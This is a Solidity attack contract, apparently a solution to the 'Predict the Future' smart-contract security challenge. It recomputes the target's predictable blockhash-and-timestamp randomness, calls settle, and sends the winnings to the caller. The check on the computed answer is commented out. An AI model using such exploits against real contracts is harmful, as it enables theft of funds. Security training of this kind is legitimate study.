pragma solidity 0.8.20;

import {PredictTheFutureChallenge} from "./PredictTheFutureChallenge.sol";

contract PredictTheFutureAttack {
    PredictTheFutureChallenge public challenge; 

    event Debug(string message, uint8 value);

    constructor(address _challengeAddress) payable {
        challenge = PredictTheFutureChallenge(_challengeAddress);
    }

    function lockInGuess() public payable {
        challenge.lockInGuess{value: 1 ether}(0);
    }

    function attack() public {
        uint8 answer = uint8(
            uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))
        ) % 10;
        emit Debug("Calculated answer", answer);

        // require(answer == 0, "Answer must be 0"); 

        emit Debug("Calling settle", answer);
        challenge.settle();

        emit Debug("Transferring balance", uint8(address(this).balance));
        payable(msg.sender).transfer(address(this).balance);
    }

    // Receive function to receive ether
    receive() external payable {}
}
